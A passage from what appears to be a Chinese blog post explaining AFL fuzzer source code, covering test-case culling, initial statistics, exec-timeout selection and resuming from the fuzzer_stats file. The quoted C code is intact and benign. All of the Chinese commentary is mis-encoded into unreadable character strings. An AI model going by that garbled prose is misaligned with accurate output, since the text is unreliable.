class="number">0</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç›²fuzzæ¨¡å¼æˆ–è€…è¯„åˆ†æ²¡æœ‰æ”¹å˜ï¼ˆæ”¹å˜å°±æ˜¯å‡ºç°äº†æ–°çš„è·¯å¾„æˆ–è€…æœ‰ä¸€ä¸ªæ›´å¥½çš„æŠµè¾¾æŸä¸ªè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹çš„å‡ºç°ï¼‰å°±ä¼šç›´æ¥return</p><p>å°† temp_v åˆå§‹åŒ–ä¸ºå…¨1ï¼Œè¡¨ç¤ºæ‰€æœ‰è¦†ç›–ç‡ä½ç½®éƒ½éœ€è¦è¢«è¦†ç›–ï¼Œé‡ç½®æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹çš„ favored æ ‡è®°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">  <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line">    <span class="comment">// é€‰æ‹©è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹</span></span><br><span class="line">    top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ä»temp_vä¸­ç§»é™¤è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹è¦†ç›–çš„æ‰€æœ‰ä½</span></span><br><span class="line">    <span class="keyword">while</span> (j--) </span><br><span class="line">      <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">        temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è´ªå¿ƒé€‰æ‹©ç®—æ³•ï¼Œå¦‚æœbitmapä¸Šçš„æŸä¸€ä¸ªä½ç½®æœ‰æœ€ä½³çš„æµ‹è¯•ç”¨ä¾‹è€Œä¸”è¯¥ä½ç½®ä¹Ÿæœªè¢«è¦†ç›–ï¼Œå°†è¯¥æµ‹è¯•ç”¨ä¾‹æ ‡è®°ä½ä¼˜é€‰ï¼Œç„¶åä»temp_vä¸­ç§»é™¤è¯¥æµ‹è¯•ç”¨ä¾‹èƒ½è¦†ç›–åˆ°çš„æ‰€æœ‰ä½ç½®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">q = queue;</span><br><span class="line"><span class="keyword">while</span> (q) &#123;</span><br><span class="line">  <span class="built_in">mark_as_redundant</span>(q, !q-&gt;favored);</span><br><span class="line">  q = q-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†æœªè¢«æ ‡è®°ä¸ºä¼˜é€‰çš„æµ‹è¯•ç”¨ä¾‹æ ‡è®°ä¸ºå†—ä½™</p><blockquote><p>è¢«æ ‡è®°ä¸ºä¼˜é€‰çš„æµ‹è¯•æ ·ä¾‹ä¼šè¢«ä¼˜å…ˆå˜å¼‚</p></blockquote><h2 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">show_init_stats</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q = queue;</span><br><span class="line">  u32 min_bits = <span class="number">0</span>, max_bits = <span class="number">0</span>;</span><br><span class="line">  u64 min_us = <span class="number">0</span>, max_us = <span class="number">0</span>;</span><br><span class="line">  u64 avg_us = <span class="number">0</span>;</span><br><span class="line">  u32 max_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (total_cal_cycles) avg_us = total_cal_us / total_cal_cycles;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!min_us || q-&gt;exec_us &lt; min_us) min_us = q-&gt;exec_us;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_us &gt; max_us) max_us = q-&gt;exec_us;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!min_bits || q-&gt;bitmap_size &lt; min_bits) min_bits = q-&gt;bitmap_size;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;bitmap_size &gt; max_bits) max_bits = q-&gt;bitmap_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;len &gt; max_len) max_len = q-&gt;len;</span><br><span class="line"></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (avg_us &gt; (qemu_mode ? <span class="number">50000</span> : <span class="number">10000</span>)) </span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">          doc_path);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s keep things moving with slow binaries. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) havoc_div = <span class="number">10</span>;     <span class="comment">/* 0-19 execs/sec   */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">20000</span>) havoc_div = <span class="number">5</span>; <span class="comment">/* 20-49 execs/sec  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) havoc_div = <span class="number">2</span>; <span class="comment">/* 50-100 execs/sec */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (max_len &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases are huge (%s) - see %s/perf_tips.txt!&quot;</span>,</span><br><span class="line">            <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (max_len &gt; <span class="number">10</span> * <span class="number">1024</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(<span class="string">&quot;Some test cases are big (%s) - see %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">            <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (useless_at_start &amp;&amp; !in_bitmap)</span><br><span class="line">      <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases look useless. Consider using a smaller set.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queued_paths &gt; <span class="number">100</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;You probably have far too many input files! Consider trimming down.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (queued_paths &gt; <span class="number">20</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(<span class="string">&quot;You have lots of input files; try starting small.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;Here are some useful stats:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">      cGRA <span class="string">&quot;    Test case count : &quot;</span> cRST <span class="string">&quot;%u favored, %u variable, %u total\n&quot;</span></span><br><span class="line">      cGRA <span class="string">&quot;       Bitmap range : &quot;</span> cRST <span class="string">&quot;%u to %u bits (average: %0.02f bits)\n&quot;</span></span><br><span class="line">      cGRA <span class="string">&quot;        Exec timing : &quot;</span> cRST <span class="string">&quot;%s to %s us (average: %s us)\n&quot;</span>,</span><br><span class="line">      queued_favored, queued_variable, queued_paths, min_bits, max_bits, </span><br><span class="line">      ((<span class="type">double</span>)total_bitmap_size) / (total_bitmap_entries ? total_bitmap_entries : <span class="number">1</span>),</span><br><span class="line">      <span class="built_in">DI</span>(min_us), <span class="built_in">DI</span>(max_us), <span class="built_in">DI</span>(avg_us));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Figure out the appropriate timeout. The basic idea is: 5x average or</span></span><br><span class="line"><span class="comment">       1x max, rounded up to EXEC_TM_ROUND ms and capped at 1 second.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       If the program is slow, the multiplier is lowered to 2x or 3x, because</span></span><br><span class="line"><span class="comment">       random scheduler jitter is less likely to have any impact, and because</span></span><br><span class="line"><span class="comment">       our patience is wearing thin =) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) exec_tmout = avg_us * <span class="number">2</span> / <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) exec_tmout = avg_us * <span class="number">3</span> / <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">else</span> exec_tmout = avg_us * <span class="number">5</span> / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    exec_tmout = <span class="built_in">MAX</span>(exec_tmout, max_us / <span class="number">1000</span>);</span><br><span class="line">    exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exec_tmout &gt; EXEC_TIMEOUT) exec_tmout = EXEC_TIMEOUT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;No -t option specified, so I&#x27;ll use exec timeout of %u ms.&quot;</span>, </span><br><span class="line">         exec_tmout);</span><br><span class="line"></span><br><span class="line">    timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timeout_given == <span class="number">3</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Applying timeout settings from resumed session (%u ms).&quot;</span>, exec_tmout);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In dumb mode, re-running every timing out test case with a generous time</span></span><br><span class="line"><span class="comment">     limit is very expensive, so let&#x27;s select a more conservative default. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>))</span><br><span class="line">    hang_tmout = <span class="built_in">MIN</span>(EXEC_TIMEOUT, exec_tmout * <span class="number">2</span> + <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;All set and ready to roll!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (total_cal_cycles) avg_us = total_cal_us / total_cal_cycles;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!min_us || q-&gt;exec_us &lt; min_us) min_us = q-&gt;exec_us;</span><br><span class="line"><span class="keyword">if</span> (q-&gt;exec_us &gt; max_us) max_us = q-&gt;exec_us;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!min_bits || q-&gt;bitmap_size &lt; min_bits) min_bits = q-&gt;bitmap_size;</span><br><span class="line"><span class="keyword">if</span> (q-&gt;bitmap_size &gt; max_bits) max_bits = q-&gt;bitmap_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (q-&gt;len &gt; max_len) max_len = q-&gt;len;</span><br><span class="line"></span><br><span class="line">q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æœ€å°&#x2F;æœ€å¤§æ‰§è¡Œæ—¶é—´ min_us&#x2F;max_us</p></li><li><p>æœ€å°&#x2F;æœ€å¤§ä½å›¾å¤§å° min_bits&#x2F;max_bits</p></li><li><p>æœ€å¤§è¾“å…¥é•¿åº¦ max_len</p></li><li><p>å¹³å‡æ‰§è¡Œæ—¶é—´ avg_us &#x3D; total_cal_us &#x2F; total_cal_cycles</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (avg_us &gt; (qemu_mode ? <span class="number">50000</span> : <span class="number">10000</span>)) </span><br><span class="line">  <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">        doc_path);</span><br></pre></td></tr></table></figure><p>qemuæ¨¡å¼ä¸‹çš„å¹³å‡æ‰§è¡Œæ—¶é—´ç»™çš„æ›´åŠ å®½æ¾ï¼Œä¹Ÿèƒ½çœ‹å‡ºqemuæ¨¡å¼ä¸‹çš„fuzzæ•ˆç‡æ›´ä½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) havoc_div = <span class="number">10</span>;     <span class="comment">/* 0-19 execs/sec   */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">20000</span>) havoc_div = <span class="number">5</span>; <span class="comment">/* 20-49 execs/sec  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) havoc_div = <span class="number">2</span>; <span class="comment">/* 50-100 execs/sec */</span></span><br></pre></td></tr></table></figure><p>å¹³å‡æ‰§è¡Œæ—¶é—´æ›´æ…¢åˆ™é™ä½å˜å¼‚å¼ºåº¦ï¼ˆå¢å¤§ havoc_divï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!resuming_fuzz) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (max_len &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases are huge (%s) - see %s/perf_tips.txt!&quot;</span>,</span><br><span class="line">          <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (max_len &gt; <span class="number">10</span> * <span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;Some test cases are big (%s) - see %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">          <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (useless_at_start &amp;&amp; !in_bitmap)</span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases look useless. Consider using a smaller set.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queued_paths &gt; <span class="number">100</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;You probably have far too many input files! Consider trimming down.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (queued_paths &gt; <span class="number">20</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;You have lots of input files; try starting small.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨éæ¢å¤å¯¹è¯ä¸‹ï¼Œç»™å‡ºä¸€äº›æ ·æœ¬çš„å¯è¯»æ€§å»ºè®®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) exec_tmout = avg_us * <span class="number">2</span> / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) exec_tmout = avg_us * <span class="number">3</span> / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">else</span> exec_tmout = avg_us * <span class="number">5</span> / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">exec_tmout = <span class="built_in">MAX</span>(exec_tmout, max_us / <span class="number">1000</span>);</span><br><span class="line">exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (exec_tmout &gt; EXEC_TIMEOUT) exec_tmout = EXEC_TIMEOUT;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å¹³å‡æ‰§è¡Œæ—¶é—´&#x2F;æœ€å¤§æ‰§è¡Œæ—¶é—´æ¨å¯¼å‡ºè¾ƒä½³çš„<code>exec_tmout</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>))</span><br><span class="line">  hang_tmout = <span class="built_in">MIN</span>(EXEC_TIMEOUT, exec_tmout * <span class="number">2</span> + <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç›²fuzzä¸”æœªè®¾ç¯å¢ƒå˜é‡åˆ™è®¾å®šæ›´ä¿å®ˆçš„æŒ‚èµ·æ—¶é—´</p><h2 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u32 <span class="title">find_start_position</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">4096</span>]; <span class="comment">/* Ought to be enough for anybody. */</span></span><br><span class="line"></span><br><span class="line">  u8  *fn, *off;</span><br><span class="line">  s32 fd, i;</span><br><span class="line">  u32 ret;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume) fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">else</span> fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/../fuzzer_stats&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  fd = <span class="built_in">open</span>(fn, O_RDONLY);</span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  i = <span class="built_in">read</span>(fd, tmp, <span class="built_in">sizeof</span>(tmp) - <span class="number">1</span>); (<span class="type">void</span>)i; <span class="comment">/* Ignore errors */</span></span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  off = <span class="built_in">strstr</span>(tmp, <span class="string">&quot;cur_path          : &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!off) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">atoi</span>(off + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> (ret &gt;= queued_paths) ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¢å¤ä¼šè¯æ¨¡å¼ä¸‹ç”¨äºå¯»æ‰¾ä»é˜Ÿåˆ—ä¸­çš„å“ªä¸ªä½ç½®å¼€å§‹ç»§ç»­æµ‹è¯•</p><p>è¯»å–fuzzer_statsæ–‡ä»¶ä¸‹çš„æœ€å¤š4095å­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œç„¶åè§£æ<code>cur_path          : </code>å­—ç¬¦ä¸²ï¼ˆstrstrè¿”å›cur_pathå‡ºç°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æŒ‡é’ˆï¼‰ï¼Œæå–å†’å·åçš„æ•°å€¼ï¼ˆæºç ä¸Šæ˜¯é€šè¿‡åç§»20æ¥è·å–çš„ï¼Œä½†æ˜¯è¯¥å­—ç¬¦ä¸²å°±æ˜¯20ï¼Œå°±æ˜¯æå–ç´§æ¥ç€çš„æ•°å€¼ï¼‰</p><h2 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h2><p>åœ¨ç¨‹åºmainå‡½æ•°çš„å‚æ•°æ˜¯<code>(0,0,0)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">write_stats_file</span><span class="params">(<span class="type">double</span> bitmap_cvg, <span class="type">double</span> stability, <span class="type">double</span> eps)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">double</span> last_bcvg, last_stab, last_eps;</span><br><span class="line">  <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">rusage</span> usage;</span><br><span class="line"></span><br><span class="line">  u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">  s32 fd;</span><br><span class="line">  FILE* f;</span><br><span class="line"></span><br><span class="line">  fd = <span class="built_in">open</span>(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  f = <span class="built_in">fdopen</span>(fd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!f) <span class="built_in">PFATAL</span>(<span class="string">&quot;fdopen() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Keep last values in case we&#x27;re called from another context</span></span><br><span class="line"><span class="comment">     where exec/sec stats and such are not readily available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!bitmap_cvg &amp;&amp; !stability &amp;&amp; !eps) &#123;</span><br><span class="line">    bitmap_cvg = last_bcvg;</span><br><span class="line">    stability  = last_stab;</span><br><span class="line">    eps        = last_eps;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    last_bcvg = bitmap_cvg;</span><br><span class="line">    last_stab = stability;</span><br><span class="line">    last_eps  = eps;</span><br><span class="line">  &#125;</span><br><span 